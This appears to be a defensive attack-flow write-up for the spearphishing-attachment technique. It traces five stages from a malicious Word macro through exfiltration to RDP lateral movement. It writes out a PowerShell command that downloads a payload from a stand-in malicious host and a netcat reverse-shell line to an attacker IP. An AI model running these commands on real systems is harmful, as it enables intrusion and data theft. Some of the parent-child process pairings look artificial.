Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through the opening of the attachment, execution of a payload, and subsequent exploitation of the web browser to facilitate further actions, such as data exfiltration or lateral movement within the network.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook (parent), Email Client (child)
- **User Action**: The user receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
- **Key Artifacts**: 
  - Email Subject: "Important Update"
  - Attachment: "Update_Document.docx"
  
```shell
# The user opens the email and downloads the attachment.
# The email client logs the action of opening the email and downloading the file.
```

**Stage 2: Execution of Malicious Payload**
- **Applications Involved**: Microsoft Word (parent), PowerShell (child)
- **User Action**: The user opens the malicious Word document, which contains a macro that executes a PowerShell command to download and execute a payload from a remote server.
- **Key Artifacts**: 
  - PowerShell Command: `Invoke-WebRequest -Uri http://malicious-server.com/payload.exe -OutFile C:\Users\Victim\Downloads\payload.exe`
  
```shell
# The macro triggers the execution of PowerShell to download the payload.
# PowerShell logs the command execution and the download of the executable.
```

**Stage 3: Payload Execution**
- **Applications Involved**: Explorer (parent), payload.exe (child)
- **User Action**: The downloaded payload is executed, establishing a reverse shell connection to the attacker's command and control (C2) server.
- **Key Artifacts**: 
  - C2 Connection: `nc -e cmd.exe attacker-ip 4444`
  
```shell
# The payload executes and initiates a reverse shell to the attacker's server.
# Network logs capture the outbound connection to the attacker's IP on port 4444.
```

**Stage 4: Web Browser Interaction for Data Exfiltration**
- **Applications Involved**: Chrome (parent), Explorer (child)
- **User Action**: The attacker uses the established shell to navigate the file system and exfiltrate sensitive data via a web upload to a cloud storage service.
- **Key Artifacts**: 
  - Data Upload URL: `https://cloud-storage.com/upload`
  
```shell
# The attacker uses a command to upload files to the cloud storage.
# Web logs capture the HTTP POST request to the upload URL with the sensitive data.
```

**Stage 5: Lateral Movement**
- **Applications Involved**: RDP (parent), Explorer (child)
- **User Action**: The attacker uses the compromised system to initiate an RDP session to another internal system, leveraging the credentials harvested from the initial access.
- **Key Artifacts**: 
  - RDP Connection: `mstsc /v:target-internal-ip`
  
```shell
# The attacker connects to another system using RDP.
# RDP logs capture the session initiation and the user account used for the connection.
```
